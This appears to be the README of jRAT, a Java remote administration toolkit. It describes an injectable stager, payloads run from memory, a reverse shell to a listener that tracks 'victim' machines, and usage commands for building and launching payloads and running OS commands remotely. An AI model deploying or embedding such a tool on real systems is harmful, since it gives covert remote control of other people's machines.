# jRAT
Remote administration toolkit that runs from memory written in Java

- **Portable**
  - Runs on Windows, Linux, MacOS

- **Modular design**
  - Additional functionality can be added at runtime by loading additional modules, and the functionality of jRAT can be extended by developing new modules.

- **Runs from memory**
  - Only the initial stager is run from disk, the main payload (Stage) and any additional modules that are loaded are loaded and run using a class loader from memory. In case an additional module depends on shared libraries they are saved to a temporary file, loaded, and removed after loading.


This remote administration toolkit consists of a simple stager that can be injected into other Java clases, or used as a standalone payload.
By running the jRAT.jar without any parameters `java -jar jRAT.jar`, a standalone payload is created containing the main method that can be used for demonstration purposes, by providing it the server/listener address and port to connect to.


**Generating a standalone payload**

`java -jar jRAT.jar`

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image1.png)

**Running a standalone payload**

`java -jar standaloner.jar <host> <port>`

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image2.png)

**Starting a listener**

`java -jar jRAT.jar <port>`

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image3.png)

After the client connects to the listener a shell will be presented, and a directory created for the victim machine in the current directory.
Directory name will be named based on the IP address of the victim machine.
By default jRAT works as a reverse shell and can be used to execute commands on the victim machine.
Additional functionality is provided by using the commands described below, which can be seen by using the `help` command:

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image4.png)

The `modules` command can be used to view all the modules that can be loaded:

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image5.png)

`load` command can be used to load a module, and after the module is loaded `show` command can be used to view all the available commands/methods in the module:

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image6.png)

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image8.png)

`deps` command can be used to view all the dependencies (additional classes/JAR's) that were loaded during module loading:

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image7.png)

OS commands can simply be run just as in a standard reverse shell:

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image9.png)

To run the command in a module use `run` command, followed by module name, command name, and any necessary parameters.
For example, shown below is an example of running the `exec` command in the `core` module:

`run core exec "nmap -p10000 127.0.0.1"`

![Screenshot](https://raw.github.com/wiki/FilipBlazekovic/jRAT/Images/Image10.png)
